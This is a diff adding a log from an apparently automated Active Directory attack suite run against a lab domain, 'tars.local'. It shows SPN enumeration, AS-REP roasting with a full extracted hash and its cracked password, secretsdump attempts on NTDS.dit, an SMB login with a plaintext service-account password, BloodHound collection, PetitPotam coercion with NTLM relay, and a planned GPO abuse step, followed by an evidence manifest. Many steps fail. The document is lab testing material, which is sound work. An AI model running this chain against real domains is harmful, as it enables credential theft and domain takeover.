@@ -1,0 +1,184 @@
+[20:15:40] SUITE START host=fedora 2026-08-10T02:15:40Z
+[20:15:40] RAM: 8.9Gi/13Gi load:30.04
+
+[20:15:40] === 01 ENUM SPN (GetUserSPNs, enumeracion funciona aunque -request no) ===
+Impacket v0.14.0.dev0+20260807.180519.239b3bcd - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName           Name        MemberOf                                         PasswordLastSet             LastLogon                   Delegation    
+-----------------------------  ----------  -----------------------------------------------  --------------------------  --------------------------  -------------
+HTTP/web.tars.local            svc_web                                                      2026-08-08 01:35:48.082216  2026-08-08 22:56:25.212898                
+HTTP/app.tars.local            deleg_svc                                                    2026-08-08 01:35:49.357979  2026-08-09 01:46:22.606979  unconstrained 
+CIFS/backup.tars.local         svc_backup  CN=Backup Operators,CN=Builtin,DC=tars,DC=local  2026-08-08 01:35:48.790489  2026-08-08 22:47:55.048311                
+MSSQLSvc/dc01.tars.local:1433  svc_sql     CN=Domain Admins,CN=Users,DC=tars,DC=local       2026-08-08 01:35:47.491466  <never>                                   
+
+
+
+rc=0
+
+[20:15:40] === 02 KERBEROAST (kinit+kvno nativos -> ccache -> $krb5tgs$23) ===
+timeout: failed to run command ‘/opt/ad-lab/suite-ad-real/samba-kerberoast.sh’: Permission denied
+rc=0
+[20:15:40] hashes TGS extraidos: 0
+
+[20:15:40] === 03 AS-REP (Samba fuerza preauth global -> extraccion autenticada etype23) ===
+/opt/ad-lab/suite-ad-real/asrep-extract-authenticated.py:44: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow()
+[+] AS-REP etype=23 enc-part=210 bytes
+$krb5asrep$23$asrep_svc@TARS.LOCAL:3d05ebec32f4c6056e9567c0faeba659$be5962ef9dae4d1cf45abbe0b350180b88f6661b58bc28cfed354a65f9ded4dec790444741850a7016083b945986f766b9e4617b4bf9ba85e3cd54872ccd80bf9174d9b16afbe558cdc38065d8b966463e8bc32623378f84fc42f9f890a97e35b5db84bdb90eb16819aa2be8c812fa54347933e44bf2cd53c41e1b401e266a35576f38db45a717a2bb3c7a7e1396574a17a3361509c62fccd0e1a5cbfd5ddf06d6b79a8aedeb4174a1f2b90da7f534674f4c68918d16a05392a149fe2d84ebe0718f
+rc=0
+
+[20:15:40] === 04 CRACK (skill cracker pure-python, RC4; TGS=13100, ASREP=18200) ===
+sin hashes TGS — skip crack
+asrep_svc@TARS.LOCAL     Autumn2026
+rc=0
+
+[20:15:40] === 05 SECRETSDUMP (expect: DRSUAPI/VSS/RRP ausentes en Samba) ===
+Impacket v0.14.0.dev0+20260807.180519.239b3bcd - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] byte indices must be integers or slices, not str
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+rc=0
+Impacket v0.14.0.dev0+20260807.180519.239b3bcd - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.
+[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+rc=0
+Impacket v0.14.0.dev0+20260807.180519.239b3bcd - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: RRP SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
+[*] Searching for NTDS.dit
+[*] Cleaning up... 
+rc=0
+Impacket v0.14.0.dev0+20260807.180519.239b3bcd - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Cleaning up... 
+rc=0
+
+[20:15:43] === 06 svc_backup (Backup Operators) superficie SMB ===
+SMB                      192.168.122.50  445    DC01             [*] Unix - Samba x32 (name:DC01) (domain:tars.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB                      192.168.122.50  445    DC01             [+] tars.local\svc_backup:Welcome1 
+SMB                      192.168.122.50  445    DC01             [*] Enumerated shares
+SMB                      192.168.122.50  445    DC01             Share           Permissions            Remark
+SMB                      192.168.122.50  445    DC01             -----           -----------            ------
+SMB                      192.168.122.50  445    DC01             sysvol          READ                   
+SMB                      192.168.122.50  445    DC01             netlogon        READ                   
+SMB                      192.168.122.50  445    DC01             IPC$                                   IPC Service (Samba 4.17.12-Debian)
+rc=0
+
+[20:15:44] === 07 BLOODHOUND CE ingest (expect: ldap3 SicilyBind vs Samba) ===
+INFO: BloodHound.py for BloodHound Community Edition
+INFO: Found AD domain: tars.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.tars.local
+WARNING: Kerberos auth to LDAP failed, trying NTLM
+Traceback (most recent call last):
+  File "/opt/ad-tools-venv/bin/bloodhound-ce-python", line 6, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/__init__.py", line 347, in main
+    bloodhound.run(collect=collect,
+    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^
+                   num_workers=args.workers,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<4 lines>...
+                   exclude_dcs=args.exclude_dcs,
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                   fileNamePrefix=args.outputprefix)
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/__init__.py", line 78, in run
+    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
+    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/ad/domain.py", line 620, in prefetch_info
+    self.get_objecttype()
+    ~~~~~~~~~~~~~~~~~~~^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/ad/domain.py", line 303, in get_objecttype
+    self.ldap_connect()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/ad/domain.py", line 114, in ldap_connect
+    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
+                                          baseDN=self.ad.baseDN, protocol=protocol)
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/bloodhound/ad/authentication.py", line 164, in getLDAPConnection
+    bound = conn.bind()
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/ldap3/core/connection.py", line 628, in bind
+    response = self.do_ntlm_bind(controls)
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/ldap3/core/connection.py", line 1373, in do_ntlm_bind
+    response = self.post_send_single_response(self.send('bindRequest', request, controls))
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/ldap3/strategy/sync.py", line 160, in post_send_single_response
+    responses, result = self.get_response(message_id)
+                        ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^
+  File "/opt/ad-tools-venv/lib64/python3.14/site-packages/ldap3/strategy/base.py", line 370, in get_response
+    raise LDAPSessionTerminatedByServerError(self.connection.last_error)
+ldap3.core.exceptions.LDAPSessionTerminatedByServerError: session terminated by server
+rc=0
+
+[20:15:45] === 08 COERCION + SMB RELAY ===
+[20:15:45] RAM disponible: 3056MB
+[20:16:03] metasploitable2 MAC= IP=?
+-rw-r--r--. 1 root root 16820 Aug  9 20:16 petitpotam.py
+-rw-r--r--. 1 root root    14 Aug  9 20:16 printerbug.py
+[20:16:03] 445 libre — arrancando ntlmrelayx
+[20:16:07] PetitPotam(EFSR) round2
+/opt/ad-lab/suite-ad-real/petitpotam.py:23: SyntaxWarning: "\ " is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\ "? A raw string is also an option.
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:192.168.122.50[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+Something went wrong, check error status => Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint)
+rc=0
+[20:16:19] printerbug(spoolss)
+  File "/opt/ad-lab/suite-ad-real/printerbug.py", line 1
+    404: Not Found
+    ^^^
+SyntaxError: illegal target for annotation
+rc=0
+
+[20:16:27] === 09 GPO ABUSE (DA: crear GPO + script startup en SYSVOL + link OU) ===
+root@192.168.122.50: Permission denied (publickey,password).
+[20:16:28] GPO_GUID=NONE
+[20:16:28] GPO create fallo — capturar output y continuar
+
+[20:16:28] === MANIFEST ===
+4954860dee544b6bef22dbb87ee744872621a67d166af9123fc2eba63afc1cb0  01-spn-enum.txt
+4d043ed9be2d1eacff61d9b5b8d37f765dd00d392e78e9ef504e31a7b5b5812e  02-kerberoast-hashes.txt
+bc0657ab75296608cba4a10810ec9a69797d6ff31849d4637124e4e4190d3e15  03-asrep.txt
+c4779ef88f5f5f09c0aa57dcdf15a2ecf5e5fa797860545f31aba8d284aa27a0  04-asrep-crack.txt
+a5520d150ec46d6780249d9c59808cdbd024b9ad6bd9bd440f405fce655991e1  05-secretsdump-backup-vss.txt
+69313709d8a07648767372f2ef45d8bf1ae0195bc162c527752c47a9e79bb4fc  05-secretsdump-full.txt
+bacb36e3a3918331a71a39733c3ae455c000cea70b89d32b10f5206912ac697a  05-secretsdump-justdc.txt
+37d12137aa4e064a0803908d9cf0f84c3de36d486cbf9b808da61f1174151885  05-secretsdump-vss.txt
+813674408f5c56b82004155c79b1d87b2a0e0ce709dd7c4b5f8d6a71688411ab  06-svcbackup-shares.txt
+e6941878a69c53032a7179256dd25b56b685795a8663c5dd51c4f5b4c13008b8  07-bloodhound-ce.txt
+e2ad3cf831bba233915c60e25281044f1280cccbf0683c99920e7fff06a4fbc1  08b-coercion-tools.txt
+4bd11eeb09fab512181ba849804d22704f2d25d276f0a6987f9864f85ecab9ea  08e-petitpotam-r2.txt
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  08f-relay-ldap-result.txt
+eb8cb9457d664539dffa8959efe246a5c8a80d3fe7b4d39724817029ad6b27a8  08g-printerbug.txt
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  08h-relay-smb-result.txt
+ba1f9a9b1a3cb95f3905b7a5b3ff03842d67ba5a9b4d3fd00ec8c9aa44db1753  09a-gpo-create.txt
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  02-kerb.hashes
+e9a4da21890874a3905aafb55d2b6b70f5ce98a707af5e9e43891879ca9d10f2  03-asrep.hashes
+[20:16:28] SUITE DONE 2026-08-10T02:16:28Z — outputs en /opt/ad-lab/evidence/suite-ad-real-20260809
